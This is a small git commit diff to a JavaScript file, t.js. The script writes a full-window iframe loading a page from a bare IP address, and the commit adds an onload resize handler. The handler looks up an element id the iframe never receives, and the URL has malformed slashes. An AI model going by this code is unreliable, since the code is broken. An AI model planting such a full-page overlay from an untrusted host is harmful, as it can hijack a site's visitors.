5f1848932465124c10698cee592a2d12a6d1b753
binglun30 <35474337+binglun30@users.noreply.github.com>
2018-06-01 01:16:37 +0800

    Update t.js

--- js/t.js
+++ js/t.js
@@ -1,1 +1,7 @@
-document.writeln("<iframe scrolling=\"yes\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" width=\"window.innerWidth + 'px'\" height=\"window.innerheight + 'px'\" src=\"http:////118.24.25.42//index.html\"><\/iframe>");
+document.writeln("<iframe scrolling=\"yes\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" width=\"100%\" height=\"100%\" src=\"http:////118.24.25.42//index.html\"><\/iframe>");
+
+window.onload = function() {
+    var iframe = document.getElementById("iframe");
+    iframe.style.width = window.innerWidth + 'px';
+    iframe.style.height = window.innerHeight + 'px';
+};
